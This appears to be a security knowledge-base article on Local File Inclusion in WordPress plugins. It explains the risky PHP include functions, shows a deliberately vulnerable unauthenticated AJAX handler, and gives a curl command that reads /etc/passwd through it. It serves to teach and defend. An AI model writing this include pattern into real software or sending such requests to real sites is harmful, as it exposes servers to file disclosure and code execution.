---
title: Local File Inclusion (LFI)
contributors:
    - rafiem
---

## Introduction

This article covers cases of possible LFI on WordPress. This includes improper file inclusion inside of the plugin/theme which can be used to gain RCE on the server.

## Useful Functions

Several functions could be useful to identify a possible LFI vulnerability:

- [`include`](https://www.php.net/manual/en/function.include.php)
- [`include_once`](https://www.php.net/manual/en/function.include-once.php)
- [`require`](https://www.php.net/manual/en/function.require.php)
- [`require_once`](https://www.php.net/manual/en/function.require-once.php)

## Example Cases

Below is an example of vulnerable code:

```php
add_action("wp_ajax_nopriv_render_lesson", "render_lesson_template");

function render_lesson_template(){
    $template_path      = urldecode( $_GET['template_path'] ?? '' );

    // For custom template return all list of lessons
    include $template_path;
    die();
}
```

To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `include` function.

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=render_lesson&template_path=/etc/passwd
```

Below are some of the findings related to Local File Inclusion:

- [Critical Vulnerabilities Patched in REHub Theme and Plugin](https://patchstack.com/articles/critical-vulnerabilities-patched-in-rehub-theme-and-plugin/)
- [Security Vulnerability In OceanWP Theme <= 3.4.1](https://patchstack.com/articles/subscriber-path-traversal-leading-to-local-file-inclusion-in-oceanwp-theme/)
- [Vulnerability In Rank Math SEO Plugin](https://patchstack.com/articles/authenticated-path-traversal-leading-to-local-file-inclusion-in-rank-math-seo-plugin/)
- [Multiple Critical Vulnerabilities Fixed In LearnPress Plugin Version <= 4.1.7.3.2](https://patchstack.com/articles/multiple-critical-vulnerabilities-fixed-in-learnpress-plugin-version/)